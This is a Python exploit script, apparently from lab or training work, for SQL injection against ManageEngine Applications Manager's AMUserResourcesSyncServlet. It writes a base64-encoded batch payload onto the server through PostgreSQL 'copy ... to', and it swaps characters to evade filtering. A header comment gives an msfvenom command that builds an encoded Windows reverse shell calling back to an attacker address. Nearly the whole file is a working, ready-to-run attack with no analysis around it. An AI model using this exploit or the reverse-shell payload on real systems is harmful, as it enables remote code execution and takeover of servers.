# Creating payload for BAT file:
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.252.14 LPORT=6969 -e x86/shikata_ga_nai -f psh-cmd -o archive.bat

#!/usr/bin/python3
import requests
import urllib3
import urllib.parse
import os
import sys
import re
import base64
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = "http://localhost:8080"
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(1)

# Set headers
def set_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    # HTTP Headers. Might need modification for each webapplication
    headers = {
        'User-Agent': useragent,
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    return headers

# Main
def main(argv):
    if len(sys.argv) == 4:
        url = sys.argv[1]
        filep = sys.argv[2]
        payl = sys.argv[3]
    else:
        print("[*] Usage: " + sys.argv[0] + " <url> <filepath> <payload_file>")
        print("[*] Example: " + sys.argv[0] + " https://192.168.252.12:8443 \"C:\\\\Program Files (x86)\\\\ManageEngine\\\\AppManager12\\\\working\\\\pgsql\\\\data\\\\amdb\\\\archive.bat\" malicious_file.bat\n")
        exit(0)

    # Check to see if it is a file to read as an argument
    if os.path.isfile(payl):
        # File exists and keep going
        # Read payload from file and base64 encode
        with open(payl, 'rb') as f:
            f_bytes = f.read()
            b64_bytes = base64.b64encode(f_bytes)
            payload = b64_bytes.decode('utf-8')
    else:
        # Print error and bail, file not there
        print("[!] The following file does not exist: " + payl + "\n")
        exit(-1)

    # URL-Encode payload
    payload = urllib.parse.quote(payload)

    # Query to perform
    query = "(select convert_from(decode('" + payload + "','base64'),'utf-8')) to '" + filep + "'"

    # HTTP headers
    headers = set_headers()

    # Variables
    urlpage = "/servlet/AMUserResourcesSyncServlet"
    params = "ForMasRange=1&userId=1"

    # Other query variables
    sqli = ";"
    prefix = "copy "
    suffix = ";-- "

    # Modify injection string via regex for character evasion
    inj_str = sqli + prefix + query + suffix
    inj_regex_str = re.sub(" ","+",inj_str)                     # Replace space for +
    inj_regex_str = re.sub("'","$$",inj_regex_str)              # Replace single quote for $$

    # Prepare for POST request
    data = params + inj_regex_str

    # Print original and modified query string
    print("\n[*] Original injection string:\n" + inj_str)
    print("\n[*] Regex modified injection string:\n" + inj_regex_str)
    print("\n")

    # Do stuff
    try:
        print("[*] HTTP response:")
        r = requests.post(url + urlpage,data=data,headers=headers,verify=False)
        print(r.text)
        print(r.headers)
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
    except requests.exceptions.RequestException as e:
        print("[!] " + e)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
